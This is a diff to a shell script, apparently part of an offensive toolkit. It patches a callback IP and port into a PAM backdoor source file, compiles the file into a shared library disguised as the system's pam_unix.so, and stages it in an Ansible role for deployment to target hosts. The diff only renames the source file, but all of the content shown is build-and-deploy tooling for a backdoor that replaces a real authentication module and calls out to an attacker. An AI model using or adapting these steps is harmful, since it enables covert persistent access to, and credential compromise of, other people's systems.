@@ -28,15 +28,15 @@ sed -i "s/^ansible_become_password.*/ansible_become_password=$pass/" ./inventory
 ansible-playbook main.yml -t setup
 
 # Change pam_backdoor.c to match callback IP and Port
-sed -i "s/^#define CALLBACK_IP.*/#define CALLBACK_IP \"$ip\"/" ./new_pam_backdoor.c
-sed -i "s/^#define CALLBACK_PORT.*/#define CALLBACK_PORT $port/" ./new_pam_backdoor.c
+sed -i "s/^#define CALLBACK_IP.*/#define CALLBACK_IP \"$ip\"/" ./pam_backdoor.c
+sed -i "s/^#define CALLBACK_PORT.*/#define CALLBACK_PORT $port/" ./pam_backdoor.c
 
 # Compile pam_backdoor.c into pam_unix.so
 # Syntax :
 # -fPIC: emit postition-independent code (suitable for dynamic linking)
 # -shared: used with -fPIC, produce a shared object that can be linked with other objects to form an executable
 # -l***: Link libpam.so and libdl.so
-gcc -fPIC -shared -o pam_unix.so new_pam_backdoor.c -lpam -ldl
+gcc -fPIC -shared -o pam_unix.so pam_backdoor.c -lpam -ldl
 
 # Copy files for use by ansible
 cp ./pam_unix.so ./roles/deploy_debian/files/
